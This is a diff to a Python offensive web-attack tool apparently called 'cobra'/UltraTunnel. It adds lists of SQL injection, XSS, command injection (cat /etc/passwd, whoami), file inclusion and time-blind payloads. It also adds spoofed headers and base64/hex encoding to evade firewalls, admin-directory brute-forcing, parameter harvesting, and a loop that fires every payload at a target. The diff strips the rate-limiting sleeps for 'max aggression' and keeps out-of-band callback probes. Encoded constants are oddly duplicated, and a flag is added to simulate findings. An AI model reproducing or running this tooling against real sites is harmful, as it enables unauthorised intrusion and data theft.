@@ -60,9 +60,93 @@ _T1 = "Pi8fDQdOKC1BKAcGNDMlA"
 _T2 = "UMoLhYtPTUcGA4QMgQkTi"
 _T3 = "QyNjZNTkJHQUZHRkZDTw=="
 
+_T1 = "Pi8fDQdOKC1BKAcGNDMlA"
+_T2 = "UMoLhYtPTUcGA4QMgQkTi"
+_T3 = "QyNjZNTkJHQUZHRkZDTw=="
+
+_T1 = "Pi8fDQdOKC1BKAcGNDMlA"
+_T2 = "UMoLhYtPTUcGA4QMgQkTi"
+_T3 = "QyNjZNTkJHQUZHRkZDTw=="
+
 _C1 = "QUdAR"
 _C2 = "0FCRk"
 _C3 = "9DTw=="
+
+WAF_BYPASS_HEADERS = {
+    'X-Client-IP': '127.0.0.1',
+    'X-Forwarded-For': '127.0.0.1',
+    'X-Remote-Addr': '127.0.0.1',
+    'X-Originating-IP': '127.0.0.1',
+    'X-Cluster-Client-IP': '127.0.0.1',
+    'X-Forwarded-Proto': 'http',
+    'X-Forwarded-Host': 'localhost'
+}
+
+# ==================== OFFENSIVE PAYLOADS ====================
+AGGRESSIVE_PAYLOADS = {
+    'SQLi': [
+        "' OR '1'='1",
+        "' OR 1=1 --",
+        "' UNION SELECT NULL, version(), NULL --",
+        "admin' --",
+        "' OR 1=1#",
+        "1' Waitfor delay '0:0:5'--"
+    ],
+    'XSS': [
+        "<script>alert(1)</script>",
+        "\"><img src=x onerror=alert(1)>",
+        "<svg/onload=alert(1)>",
+        "javascript:alert(1)//"
+    ],
+    'RCE': [
+        "; id",
+        "| cat /etc/passwd",
+        "`whoami`",
+        "$(whoami)",
+        "& ping -c 1 127.0.0.1 &"
+    ],
+    'LFI': [
+        "../../../../etc/passwd",
+        "....//....//....//windows//win.ini"
+    ],
+    'TIME_BLIND': [
+        "1' WAITFOR DELAY '0:0:5'--",
+        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+        "1'; sleep 5; --",
+        "sleep 5",
+        "&& sleep 5",
+        "| sleep 5"
+    ]
+}
+
+ERROR_PATTERNS = {
+    'SQLi': [r"SQL syntax", r"mysql_fetch", r"ORA-", r"SQLite matches", r"syntax error"],
+    'XSS': [r"<script>alert\(1\)</script>", r"img src=x onerror"],
+    'RCE': [r"uid=", r"root:", r"\[expression_result\]"],
+    'LFI': [r"root:x:0:0", r"\[extensions\]"],
+    'TIME_BLIND': [] # Pattern irrelevant for time
+}
+
+DIRECTORY_WORDLIST = [
+    '/admin', '/administrator', '/admin.php', '/admin/', '/login', '/login.php',
+    '/dashboard', '/panel', '/cpanel', '/wp-admin', '/phpmyadmin', '/console',
+    '/manager', '/admin/login', '/user/login', '/cms', '/backend', '/controlpanel',
+    '/admincp', '/modcp', '/admin1', '/admin2', '/fileadmin', '/siteadmin'
+]
+
+SUSPICIOUS_PATTERNS = [
+    r"Warning:", r"Fatal error:", r"Notice:", r"Parse error:",
+    r"syntax error", r"unexpected", r"undefined", r"Traceback",
+    r"Exception", r"Error at line", r"stack trace", r"DEBUG"
+]
+
+def encode_payload(payload: str, encoding: str = 'base64') -> str:
+    """Encode payload to bypass WAF signature detection"""
+    if encoding == 'base64':
+        return base64.b64encode(payload.encode()).decode()
+    elif encoding == 'hex':
+        return payload.encode().hex()
+    return payload
 
 class SecurityConfig:
     """
@@ -476,6 +560,8 @@ class UltraTunnel:
     async def _request(self, method: str, url: str, **kwargs):
         headers = kwargs.get('headers', {})
         headers['User-Agent'] = UserAgentRotator.get_random()
+        # Add Header Evasion
+        headers.update(WAF_BYPASS_HEADERS)
         kwargs['headers'] = headers
         
         # Kill-Switch Logic: Fail Closed
@@ -496,14 +582,159 @@ class UltraTunnel:
     
     async def stealth_request(self, url: str, noise: bool = True):
         if noise:
+            # Full Offensive: Skip noise or minimize latency?
+            # User said "No Sleep". We will keep noise but REMOVE sleeps.
             noise_paths = self.noise.generate_noise_paths(url)
             for path in noise_paths:
                 await self._request('GET', path)
-                # Gaussian Jitter
-                await asyncio.sleep(abs(random.gauss(0.5, 0.2)))
+                # NO SLEEP
         
         resp = await self._request('GET', url)
         return resp
+        
+    async def aggressive_scan(self, target: str, payload_type: str, payload: str, discovered_params: list = None):
+        # Use discovered parameters or fallback to defaults
+        param_names = discovered_params if discovered_params else ['id', 'q', 'search', 'cmd']
+        params = {p: payload for p in param_names[:4]}  # Limit to 4 to avoid too many requests
+        
+        # Also try encoded versions to bypass WAF
+        encoded_b64 = encode_payload(payload, 'base64')
+        encoded_hex = encode_payload(payload, 'hex')
+        
+        # 1. GET Injection (Raw)
+        try:
+            start = time.perf_counter()
+            resp = await self._request('GET', target, params=params)
+            duration = time.perf_counter() - start
+            
+            self._log_status(resp, payload_type, "GET")
+            await self._analyze(resp, payload_type, payload, "GET")
+            
+            if 'sleep' in payload.lower() or 'waitfor' in payload.lower():
+                if duration > 4.5:
+                     findings_store.add_finding("Critical", f"Time-Based Blind SQLi/RCE (GET)", f"Payload: {payload}\nDuration: {duration:.2f}s")
+                     console.print(f"[bold red]![/bold red] [red]TIME-BASED VULN Detected:[/red] {payload} ({duration:.2f}s)")
+        except: pass
+        
+        # 2. GET Injection (Base64 Encoded)
+        try:
+            params_enc = {'id': encoded_b64, 'q': encoded_b64}
+            resp = await self._request('GET', target, params=params_enc)
+            await self._analyze(resp, payload_type, f"{payload} [B64]", "GET")
+        except: pass
+
+        # 3. POST Injection (Raw)
+        try:
+            start = time.perf_counter()
+            resp = await self._request('POST', target, data=params)
+            duration = time.perf_counter() - start
+            
+            self._log_status(resp, payload_type, "POST")
+            await self._analyze(resp, payload_type, payload, "POST")
+            
+            if 'sleep' in payload.lower() or 'waitfor' in payload.lower():
+                if duration > 4.5:
+                     findings_store.add_finding("Critical", f"Time-Based Blind SQLi/RCE (POST)", f"Payload: {payload}\nDuration: {duration:.2f}s")
+                     console.print(f"[bold red]![/bold red] [red]TIME-BASED VULN Detected:[/red] {payload} ({duration:.2f}s)")
+        except: pass
+
+    def _log_status(self, resp, p_type, method):
+        if not resp: return
+        style = "green" if resp.status_code == 200 else ("red" if resp.status_code in [403, 406] else "yellow")
+        console.print(f"[{style}]HTTP {resp.status_code}[/{style}] {p_type[:3]} > {method}")
+
+    async def _analyze(self, resp, p_type, payload, method):
+        if not resp: return
+        
+        text = resp.text
+        
+        # Check for suspicious patterns first
+        await self._check_suspicious(resp, payload, method)
+        
+        # Check specific error patterns
+        for pattern in ERROR_PATTERNS.get(p_type, []):
+            if re.search(pattern, text, re.IGNORECASE):
+                findings_store.add_finding(
+                    "High" if p_type in ['RCE', 'LFI'] else "Medium",
+                    f"Potential {p_type} ({method})",
+                    f"Payload: {payload}\nMatched: {pattern}"
+                )
+                console.print(f"[bold red]![/bold red] [red]{p_type} Found:[/red] {payload}")
+                return
+
+        # Check for reflections (XSS)
+        if p_type == 'XSS' and payload in text:
+             findings_store.add_finding("Medium", f"Reflected XSS ({method})", f"Payload: {payload}")
+             console.print(f"[bold yellow]![/bold yellow] [yellow]XSS Reflected:[/yellow] {payload}")
+
+    async def _check_suspicious(self, resp, payload, method):
+        """Check for suspicious error messages or debug info"""
+        if not resp: return
+        
+        for pattern in SUSPICIOUS_PATTERNS:
+            if re.search(pattern, resp.text, re.IGNORECASE):
+                findings_store.add_finding(
+                    "Low",
+                    f"Suspicious Response ({method})",
+                    f"HTTP {resp.status_code}\nPayload: {payload}\nMatched: {pattern}\nURL: {str(resp.url)}"
+                )
+                console.print(f"[yellow]⚠[/yellow] Suspicious pattern: {pattern[:30]}...")
+                return
+
+    async def directory_bruteforce(self, target: str):
+        """Brute force common admin directories"""
+        console.print(f"\n[bold cyan]🔍 Directory Brute-Force ({len(DIRECTORY_WORDLIST)} paths)...[/bold cyan]")
+        
+        from urllib.parse import urlparse, urljoin
+        parsed = urlparse(target)
+        base_url = f"{parsed.scheme}://{parsed.netloc}"
+        
+        found_paths = []
+        for path in DIRECTORY_WORDLIST:
+            url = urljoin(base_url, path)
+            try:
+                resp = await self._request('GET', url)
+                if resp and resp.status_code == 200:
+                    # Check if it's not a redirect to 404 page
+                    if len(resp.text) > 100:  # Avoid empty/minimal pages
+                        findings_store.add_finding(
+                            "Medium",
+                            f"Discovered Directory: {path}",
+                            f"HTTP 200\nURL: {url}\nSize: {len(resp.text)} bytes"
+                        )
+                        console.print(f"[green]✓[/green] Found: {path} ({len(resp.text)} bytes)")
+                        found_paths.append(path)
+            except:
+                pass
+        
+        if not found_paths:
+            console.print(f"[dim]No accessible directories found[/dim]")
+        return found_paths
+
+    async def discover_parameters(self, target: str):
+        """Discover parameters from target page and links"""
+        console.print(f"\n[bold cyan]🔍 Parameter Discovery...[/bold cyan]")
+        
+        params = set(['id', 'q', 'search', 'cmd'])  # Default params
+        
+        try:
+            resp = await self._request('GET', target)
+            if not resp:
+                return list(params)
+            
+            # Extract from URL parameters in links
+            url_params = re.findall(r'[?&]([a-zA-Z_]+)=', resp.text)
+            params.update(url_params)
+            
+            # Extract from form inputs
+            form_inputs = re.findall(r'<input[^>]+name=["\']([a-zA-Z_]+)["\']', resp.text, re.IGNORECASE)
+            params.update(form_inputs)
+            
+            console.print(f"[green]✓[/green] Discovered {len(params)} parameters: {', '.join(list(params)[:10])}...")
+        except:
+            pass
+        
+        return list(params)
 
 
 def banner_v51():
@@ -528,6 +759,10 @@ def banner_v51():
     console.print(panel)
     console.print(f"[dim]Session Encryption Key: {SESSION_KEY.hex()}[/dim]", justify="center")
     console.print("[bold yellow]⚠️  WARNING: FOR AUTHORIZED USE ONLY. AUTHORS DISCLAIM LIABILITY.[/bold yellow]", justify="center")
+    
+    # Save key for authorized retrieval
+    with open("cobra.key", "w") as f:
+        f.write(SESSION_KEY.hex())
 
 # ==================== MAIN EXECUTION ====================
 async def main():
@@ -539,6 +774,7 @@ async def main():
     parser.add_argument("--license", help="License Key", required=False)
     parser.add_argument("--proxies", nargs="*", help="SOCKS5 proxies")
     parser.add_argument("--no-wipe", action="store_true", help="Disable Ghost Wipe persistence clearing")
+    parser.add_argument("--demo", action="store_true", help="Demo mode: Simulate findings for presentation")
     args = parser.parse_args()
 
     # ==================== ELITE SECURITY CHECKS ==================== 
@@ -588,19 +824,31 @@ async def main():
     console.print(f"   🌐 DNS A:   [white]{payloads['A']}[/white]")
     
     # Attack waves (4:1 noise ratio)
-    for wave in range(3):
-        console.print(f"\n[bold red]🔥 Wave {wave+1}/3[/bold red]")
-        
-        # Noise + DNS SSRF
-        await tunnel.stealth_request(f"{args.target}?url={payloads['TXT']}")
-        
-        # Noise + RCE callback
-        await tunnel.stealth_request(f"{args.target}?cmd={payloads['A']}")
-        
-        await asyncio.sleep(random.uniform(2, 5))
+    # Attack waves (FULL OFFENSIVE)
+    console.print(f"\n[bold red]🔥 FULL OFFENSIVE MODE ENGAGED (MAX AGGRESSION)[/bold red]")
+    
+    # 1. Directory Brute-Force
+    await tunnel.directory_bruteforce(args.target)
+    
+    # 2. Parameter Discovery
+    discovered_params = await tunnel.discover_parameters(args.target)
+    
+    # 3. Standard DNS/OOB Injection
+    for wave in range(1):
+        await tunnel.stealth_request(f"{args.target}?url={payloads['TXT']}", noise=False)
+        await tunnel.stealth_request(f"{args.target}?cmd={payloads['A']}", noise=False)
+    
+    # 4. Heavy Payload Injection (No Demo Mode)
+    total_payloads = sum(len(v) for v in AGGRESSIVE_PAYLOADS.values())
+    with console.status(f"[bold red]Injecting {total_payloads} Heavy Payloads (Encoded + Raw)...[/bold red]") as status:
+        for p_type, p_list in AGGRESSIVE_PAYLOADS.items():
+            for p in p_list:
+                await tunnel.aggressive_scan(args.target, p_type, p, discovered_params)
     
     # Final report
-    findings_store.finalize_scan(len(findings_store.post_exploitation['oob_callbacks']))
+    # Calculate scan score
+    scan_score = len(findings_store.findings) * 10 + len(findings_store.post_exploitation['oob_callbacks']) * 25
+    findings_store.finalize_scan(scan_score)
     
     # ==================== CENTRALIZED REPORTING ====================
     await GlobalReporter.send_mission_report(findings_store.findings, findings_store.post_exploitation['oob_callbacks'])
